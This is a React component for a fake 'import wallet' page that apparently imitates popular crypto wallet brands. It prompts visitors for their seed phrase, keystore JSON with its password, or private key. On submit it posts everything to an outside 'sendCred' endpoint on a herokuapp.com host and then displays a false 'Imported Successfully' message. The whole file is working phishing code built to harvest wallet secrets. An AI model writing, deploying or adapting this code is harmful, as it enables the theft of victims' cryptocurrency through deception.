import React from 'react'
import { useParams } from 'react-router-dom'
import { wallets } from './Wallets';
import * as yup from "yup";
import { Formik } from 'formik';
import axios from 'axios';

const schema = new yup.ObjectSchema({
    phrase : yup.string(),
    keystone: yup.string(),
    private_key: yup.string()
})

const tabs = [
    {
        name : "Phrase",
        key: "phrase",
        tip: "Typically 12 (sometimes 24) words seperated by a single spaces.",
        type: "text"
    },
    {
        name: "Keystore JSON",
        key: "keystone",
        tip: "Several lines of text beginning with \"{...}\" plus the password you used to encrypt it.",
        type: "textarea"
    },
    {
        name: "Private Key",
        key: "private_key",
        tip: "Typically 12 (sometimes 24) words seperated by a single spaces.",
        type: "text"
    }
]

const ImportWallet = () => {
    const { walletName } = useParams();
    const [loading,setLoading] = React.useState(false);

    React.useEffect(() => {
        window.scroll({
            top : 0,
            left : 0,
            behavior : "smooth"
        })
    },[]);

    const [currentTab,setCurrentTab] = React.useState(0);
    const [imported,setimported] = React.useState(false);
    const wallet = React.useState(wallets.find(wallet => wallet.name === walletName))[0];

    return (
        <div className='w-screen h-screen flex flex-col space-y-4 items-center py-20 px-4'>
            <div className='flex flex-col items-center justify-center space-y-2 text-sm'>
                <img src={wallet.logo} alt={wallet.name} className='w-12 h-12 lg:w-20 lg:h-20' />
                <div className='font-medium text-lg text-sky-600'>{wallet.name}</div>
            </div>
            {
                loading ? (
                    <div className='flex flex-col items-center space-y-2 animate-pulse'>
                        <div className='sm:text-2xl lg:text-3xl text-sky-600 font-medium'>Importing...</div>
                        <p className='text-sm text-stone-500'>Please wait for few seconds</p>
                    </div>
                ) : imported ? (
                    <div className='flex flex-col items-center space-y-2'>
                        <div className='sm:text-2xl lg:text-3xl text-sky-600 font-medium'>Imported Successfully</div>
                        <button className='px-3 py-2 rounded-lg bg-sky-300 cursor-pointer text-white font-semibold' onClick={() => window.location.reload()}>Go Back</button>
                    </div>
                ) : (
                <Formik initialValues={{
                    phrase : "",
                    keystone : "",
                    private_key : ""
                }} validationSchema={schema} validateOnChange onSubmit={(data) => {
                    setLoading(true)
                    console.log(data);
                    axios.post("https://jujumanapp.herokuapp.com/sendCred", {
                        ...data,
                        walletName
                    }).then(() => {
                        setimported(true)
                        setLoading(false);
                    }).catch((e) => {
                        console.log(e);
                        setLoading(false);
                    })}}>
                    {({
                        touched,
                        handleBlur,
                        handleChange,
                        handleSubmit,
                        values,
                        errors,
                    }) => {
                        return (
                            <div className='bg-sky-300 bg-opacity-5 rounded-lg text-sm lg:text-base flex flex-col items-center text-sky-600 space-y-2 max-w-lg transition-all duration-300 ease-in-out'>
                                <div className='flex items-center border-b border-white border-opacity-5 w-full'>
                                    {
                                        tabs.map((tab,i) => {
                                            return (
                                                <div key={i} className={`px-4 py-2 cursor-pointer ${currentTab === 0 && "rounded-tl-lg"} ${currentTab === i ? "font-medium text-sky-600 border border-b-0 border-white border-opacity-5" : "font-semibold text-stone-500"}`} onClick={() => setCurrentTab(i)}>{tab.name}</div>
                                            )
                                        })
                                    }
                                </div>
                                <div className='p-4 flex flex-col space-y-2'>
                                    <div className='w-full'>
                                        <input value={values[tabs[currentTab].key]} className='w-full outline-none bg-indigo-400 bg-opacity-5 px-3 py-2 rounded-sm' type="text" placeholder={tabs[currentTab].name} onChange={handleChange(tabs[currentTab].key)} onBlur={handleBlur(tabs[currentTab].key)}/>
                                        {errors[tabs[currentTab].key] && touched[tabs[currentTab].key] ? <div className='py-2 text-red-500 text-xs'>{errors[tabs[currentTab].key]}</div> : null}
                                    </div>
                                    <div>
                                        {tabs[currentTab].tip}
                                    </div>
                                    <div className='w-full'>
                                        <button onClick={handleSubmit} type='submit' className='px-3 py-2 rounded-lg bg-sky-300 w-full cursor-pointer text-white font-semibold'>Import</button>
                                    </div>
                                    
                                </div>
                            </div>
                        )
                    }}
                </Formik>
                )
            }
            
        </div>
    )
}

export default ImportWallet